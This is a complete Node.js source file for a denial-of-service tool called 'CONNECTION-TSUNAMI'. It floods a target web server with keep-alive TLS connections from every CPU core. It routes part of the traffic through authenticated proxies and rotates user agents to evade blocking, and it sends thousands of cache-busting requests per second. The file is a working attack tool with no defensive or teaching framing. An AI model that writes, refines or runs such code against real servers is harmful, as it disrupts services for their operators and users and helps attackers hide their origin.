// R10-4: CONNECTION-TSUNAMI - Keep-Alive Connection Flood
// Focus: Saturate connection limits
// Technique: Long-lived connections + Pipelining
// Updated: Mixed main IP + proxies + authenticated proxy support

const http = require('http');
const https = require('https');
const tls = require('tls');
const net = require('net');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');

const CPU_CORES = os.cpus().length;
let proxies = [];
let userAgents = [];

// Parse proxy line - supports both formats: host:port and host:port:username:password
function parseProxy(proxyLine) {
    const parts = proxyLine.split(':');
    if (parts.length === 4) {
        return {
            host: parts[0],
            port: parseInt(parts[1]),
            username: parts[2],
            password: parts[3],
            auth: true
        };
    } else if (parts.length >= 2) {
        return {
            host: parts[0],
            port: parseInt(parts[1]),
            auth: false
        };
    }
    return null;
}

// Load proxies and user agents
try {
    const proxyLines = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
    
    proxies = proxyLines.map(parseProxy).filter(p => p !== null);
    console.log(`[R10-4] Loaded ${proxies.length} proxies (${proxies.filter(p => p.auth).length} authenticated)`);
} catch (e) {
    console.log('[R10-4] No proxy.txt found, running with main IP only');
}

// Mix settings
const USE_MAIN_IP = true;
const MIX_RATIO = 0.3; // 30% main IP

try {
    userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
    console.log(`[R10-4] Loaded ${userAgents.length} user agents`);
} catch (e) {}

class ConnectionPool {
    constructor(target, size) {
        this.pool = [];
        this.target = target;
        this.size = size;
        this.mainIpCount = 0;
        this.proxyCount = 0;
        this.init();
    }
    
    shouldUseMainIp() {
        return USE_MAIN_IP && Math.random() < MIX_RATIO;
    }
    
    init() {
        for (let i = 0; i < this.size; i++) {
            this.addConnection();
        }
    }
    
    addConnection() {
        const useMain = this.shouldUseMainIp();
        
        if (useMain || proxies.length === 0) {
            // Direct connection (main IP)
            const tlsSocket = tls.connect(443, this.target.hostname, {
                servername: this.target.hostname,
                rejectUnauthorized: false
            }, () => {
                this.pool.push(tlsSocket);
                this.mainIpCount++;
            });
            
            tlsSocket.on('error', () => {
                const idx = this.pool.indexOf(tlsSocket);
                if (idx > -1) this.pool.splice(idx, 1);
                setTimeout(() => this.addConnection(), 1000);
            });
            
            return;
        }
        
        // Proxy connection with auth support
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        
        const netSocket = net.connect(proxy.port, proxy.host, () => {
            let connectReq = `CONNECT ${this.target.hostname}:443 HTTP/1.1\r\nHost: ${this.target.hostname}:443\r\n`;
            
            if (proxy.auth) {
                const auth = Buffer.from(`${proxy.username}:${proxy.password}`).toString('base64');
                connectReq += `Proxy-Authorization: Basic ${auth}\r\n`;
            }
            
            connectReq += '\r\n';
            netSocket.write(connectReq);
            
            netSocket.once('data', () => {
                const tlsSocket = tls.connect({
                    socket: netSocket,
                    servername: this.target.hostname,
                    rejectUnauthorized: false
                }, () => {
                    this.pool.push(tlsSocket);
                    this.proxyCount++;
                });
                
                tlsSocket.on('error', () => {
                    const idx = this.pool.indexOf(tlsSocket);
                    if (idx > -1) this.pool.splice(idx, 1);
                    setTimeout(() => this.addConnection(), 1000);
                });
            });
        });
        
        netSocket.on('error', () => {
            setTimeout(() => this.addConnection(), 1000);
        });
    }
    
    sendRequest() {
        if (this.pool.length === 0) return;
        
        const socket = this.pool[Math.floor(Math.random() * this.pool.length)];
        const ua = userAgents.length > 0 
            ? userAgents[Math.floor(Math.random() * userAgents.length)]
            : 'Mozilla/5.0';
        
        const request = `GET ${this.target.pathname}?${Math.random()} HTTP/1.1\r\nHost: ${this.target.hostname}\r\nUser-Agent: ${ua}\r\nConnection: keep-alive\r\n\r\n`;
        
        socket.write(request);
    }
}

if (cluster.isMaster) {
    console.log(`[R10-4] CONNECTION-TSUNAMI launching on ${CPU_CORES} cores`);
    console.log(`[R10-4] Mode: ${USE_MAIN_IP ? 'MIXED' : 'PROXY-ONLY'} (${MIX_RATIO*100}% main IP)`);
    for (let i = 0; i < CPU_CORES; i++) cluster.fork();
    
    setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
} else {
    const target = new URL(process.argv[2]);
    const time = process.argv[3] || 300;
    
    const pool = new ConnectionPool(target, 500);
    let requestCount = 0;
    
    setTimeout(() => {
        const interval = setInterval(() => {
            for (let i = 0; i < 500; i++) {
                pool.sendRequest();
                requestCount++;
            }
        }, 100);
        
        setInterval(() => {
            console.log(`[R10-4] RPS: ${requestCount} | Pool: ${pool.pool.length} | Main: ${pool.mainIpCount} | Proxy: ${pool.proxyCount}`);
            requestCount = 0;
        }, 1000);
        
        setTimeout(() => {
            clearInterval(interval);
            process.exit(0);
        }, time * 1000);
    }, 5000);
}